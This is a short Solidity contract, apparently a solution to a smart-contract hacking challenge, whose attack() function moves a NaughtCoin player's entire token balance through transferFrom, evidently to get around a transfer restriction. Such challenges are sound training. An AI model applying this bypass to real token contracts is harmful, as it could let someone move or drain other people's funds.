// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {NaughtCoin} from "./NaughtCoin.sol";

contract NaughtCoinHack {
    NaughtCoin private immutable TARGET;

    constructor(address _target) {
        TARGET = NaughtCoin(_target);
    }

    function attack() external {
        address player = TARGET.player();
        uint256 amount = TARGET.balanceOf(player);
        TARGET.transferFrom(player, address(this), amount);
    }
}
